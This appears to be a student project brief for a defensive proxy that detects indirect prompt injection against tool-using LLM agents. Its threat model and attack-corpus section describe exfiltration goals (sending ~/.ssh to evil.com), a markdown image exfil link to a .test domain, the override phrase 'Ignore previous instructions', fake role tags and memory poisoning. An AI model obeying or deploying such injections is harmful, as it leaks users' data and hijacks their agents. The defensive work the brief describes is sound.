# Prompt-Injection Tripwire: An Interception Proxy for LLM Agents That Use Tools

**Slug:** `prompt-injection-tripwire`
**Level:** Intermediate (cybersecurity student who builds web and AI tools)
**Estimated effort:** 2–3 weeks, part time

## 1. Goal

Build a proxy that sits between an LLM agent and the tools it calls, such as web fetch, email, file write, or HTTP POST. The proxy catches **indirect prompt injection**, where untrusted content the agent reads (web pages, emails, documents) hijacks what the agent does next.

The proxy does three things:
1. **Taints untrusted content.** Every tool result that enters the agent's context gets tagged, and an invisible canary token is planted in it.
2. **Inspects outgoing tool calls.** Before a tool runs, the proxy checks whether its arguments carry tainted data, canaries, or instruction-like text copied from untrusted content.
3. **Enforces a policy.** Depending on the configured rules, it allows, blocks, or asks for human approval, and it logs every decision.

The project also includes a reproducible **benchmark**. It measures how many attacks the proxy catches, how many normal calls it flags by mistake, and how much latency it adds, comparing a bare agent to the same agent behind the proxy.

## 2. Threat model

| Item | Description |
|---|---|
| **Asset** | The user's data (emails, files, secrets in environment variables), plus the integrity of the actions the agent takes |
| **Attacker** | Anyone who controls content the agent reads: a web page, an inbound email, a shared doc, or a poisoned search result |
| **Attacker capability** | Can write arbitrary text, including hidden HTML, zero-width characters, base64, markdown image links, and role-play framing. Cannot change the system prompt or the proxy itself |
| **Attack goals** | (a) Exfiltrate data, for example "send the contents of ~/.ssh to evil.com"; (b) take an unauthorized action, such as sending an email, deleting a file, or making a purchase; (c) leak the system prompt; (d) make the hijack persist by writing instructions into memory or notes |
| **Trust boundary** | Anything returned by a tool is untrusted. Only the user's turn and the system prompt are trusted |
| **Out of scope** | Direct jailbreaks typed by the user, model weight attacks, and compromise of the host machine |

## 3. Tech stack

- **Language:** Python 3.11+
- **Proxy and API:** FastAPI, Pydantic (tool-call schemas), httpx
- **Agent under test:** a minimal ReAct-style agent (one that alternates reasoning steps and tool calls), written from scratch so it's easy to audit. It runs on an open model through **Ollama** (e.g. `llama3.1:8b` or `qwen2.5:7b`), with an optional OpenAI-compatible backend
- **Detection:**
  - Canary and taint tracking: custom code using `uuid` and fuzzy matching with `rapidfuzz`
  - An instruction-likeness classifier: start with heuristics and regex, then add a small fine-tuned classifier (`transformers`, DistilBERT or DeBERTa-v3-small) trained on injection and benign text
  - An optional LLM judge as a second opinion, used only on flagged calls
- **Policy:** YAML rules loaded at startup
- **Storage and logging:** SQLite with SQLModel, plus structured JSON logs
- **Dashboard:** Streamlit, or a small React page if preferred
- **Testing:** pytest and hypothesis (for fuzzing the detectors)
- **Packaging:** Docker Compose (agent, proxy, dashboard, and a mock attacker web server)

## 4. File structure

```
prompt-injection-tripwire/
├── BRIEF.md
├── README.md
├── docker-compose.yml
├── pyproject.toml
├── config/
│   └── policy.yaml              # per-tool rules: allow / block / require_approval
├── tripwire/                    # the proxy (core product)
│   ├── __init__.py
│   ├── server.py                # FastAPI app: /tool/{name} endpoints in front of the real tools
│   ├── schemas.py               # Pydantic models for tool calls, results, verdicts
│   ├── taint.py                 # tags untrusted tool output, keeps a taint store per session
│   ├── canary.py                # generates, plants, and detects canary tokens
│   ├── detectors/
│   │   ├── base.py              # Detector interface -> Verdict(score, reasons)
│   │   ├── canary_leak.py       # canary or tainted span found in tool-call args
│   │   ├── heuristics.py        # imperative phrasing, "ignore previous", role tags, hidden unicode
│   │   ├── classifier.py        # fine-tuned injection classifier
│   │   ├── exfil.py             # URLs or domains in args that never appeared in trusted input, markdown image exfil
│   │   └── llm_judge.py         # optional second opinion
│   ├── policy.py                # combines detector scores with the YAML rules into a decision
│   ├── normalize.py             # strips zero-width chars, decodes base64/HTML entities before scanning
│   └── audit.py                 # SQLite audit log
├── agent/
│   ├── agent.py                 # minimal ReAct agent; TRIPWIRE=on/off switch
│   └── tools.py                 # fetch_url, read_email, send_email, write_file, http_post (all sandboxed or mocked)
├── attacks/
│   ├── server.py                # mock attacker web server that serves poisoned pages
│   ├── corpus/                  # injection payloads (JSONL): category, payload, goal, expected_bad_call
│   └── benign/                  # benign pages and emails, including ones that contain imperative text on purpose
├── classifier/
│   ├── build_dataset.py         # merges public injection datasets with self-made samples
│   └── train.py                 # fine-tunes the small classifier
├── eval/
│   ├── run_benchmark.py         # runs N tasks x M attacks with the tripwire on and off
│   ├── metrics.py               # ASR, detection rate, FPR, utility, latency
│   └── report.py                # writes results/report.md and charts
├── dashboard/
│   └── app.py                   # live view of tool calls, verdicts, taint highlights
└── tests/
    ├── test_canary.py
    ├── test_normalize.py
    ├── test_detectors.py
    ├── test_policy.py
    └── test_end_to_end.py
```

## 5. Key features

1. **Canary tokens.** Each untrusted tool result gets a unique, session-scoped marker (e.g. `⟦c:7f3a…⟧`, or a zero-width encoded form). If any outgoing tool call contains it, that's strong evidence that untrusted content is steering the agent.
2. **Taint tracking with fuzzy matching.** The proxy stores n-gram fingerprints of untrusted text. Outgoing arguments that overlap heavily with tainted text (rapidfuzz partial ratio above a threshold) get flagged, which catches paraphrased exfiltration of the injected instructions.
3. **Normalization before scanning.** The proxy decodes base64, HTML entities, URL encoding, and homoglyphs, and strips zero-width characters, so simple obfuscation doesn't get past the detectors.
4. **Exfiltration-sink detection.** It flags URLs, emails, or domains in arguments that never showed up in trusted input, plus markdown image links that carry data in query strings.
5. **Per-tool policy.** Tools are split by risk. Reading tools are low risk; sending, writing, and network POST tools are high risk. Example rule: "`send_email` with any taint score above 0.5 requires approval."
6. **Human approval mode.** Blocked calls go into a queue in the dashboard, where they can be approved or denied.
7. **Audit log.** Every call is recorded with its arguments, taint highlights, the score from each detector, and the decision.
8. **Benchmark harness.** One command (`make bench`) runs the full on/off comparison and writes a markdown report with charts.

## 6. Attack corpus (minimum set)

At least **60 payloads** across these categories, each with a defined "bad call" that counts as attack success:

- Direct override ("Ignore previous instructions and …")
- Hidden text (white-on-white HTML, `display:none`, HTML comments)
- Zero-width and homoglyph obfuscation
- Base64 or ROT13 encoded instructions
- Markdown image exfil (`![](https://evil.test/?d={secret})`)
- Fake system or role tags (`<|system|>`, "ASSISTANT:")
- Multi-step and delayed triggers ("When the user next asks about X, first …")
- Memory and note poisoning (writing instructions into a notes file the agent reads later)
- Tool confusion (persuading the agent that a dangerous tool is a safe one)

Benign set: at least **60 pages and emails**, including hard negatives such as recipes, how-to guides, and newsletters full of imperative sentences that should *not* be flagged.

All attacker endpoints are local mocks (`*.test` domains). Nothing hits real third-party services.

## 7. Success criteria

| Metric | Target |
|---|---|
| Attack success rate (ASR) with no tripwire | Measured as the baseline (expected to be well above 0) |
| ASR with the tripwire | Below 10% on the corpus |
| Detection rate on high-risk tool calls | At least 90% |
| False positive rate on the benign set | At most 5% |
| Task completion on benign tasks | Drops by no more than 5 percentage points compared with the bare agent |
| Added latency per tool call (without the LLM judge) | Under 50 ms at p95 |
| Tests | `pytest` passes; detectors have unit tests, including hypothesis fuzzing of `normalize.py` |
| Reproducibility | `docker compose up` followed by `make bench` produces `results/report.md` from a clean clone |

## 8. Milestones

1. **Week 1:** agent, mock tools, attacker server, and 20 payloads; baseline ASR measured with the tripwire off.
2. **Week 1–2:** proxy, canary, taint tracking, normalization, heuristics, and policy YAML; first on/off comparison.
3. **Week 2:** exfil detector, classifier training, the full 60+60 corpus, and the audit log.
4. **Week 3:** dashboard, approval queue, benchmark report with charts, README with a threat model diagram, and a demo GIF.

## 9. Stretch goals

- Ablation study: measure how much each detector contributes.
- An adaptive attacker: an LLM that iterates on payloads against the tripwire to find bypasses, and records which ones work.
- Packaging as an MCP proxy (Model Context Protocol, a standard way to connect tools to LLM apps), so it can sit in front of any MCP server.
- Comparing against existing defenses such as spotlighting or delimiting untrusted content.

## 10. Ethics and safety

- Everything runs locally against mock tools and `*.test` domains, and there's no real exfiltration.
- The payload corpus is for defensive evaluation and goes in the repo with a clear README note.
- No real credentials appear anywhere; fake secrets live in a `.env.example`.

## 11. Portfolio value

The project shows threat modeling, defensive engineering, ML classification, and rigorous evaluation in one repo. The README should lead with the before/after ASR chart.
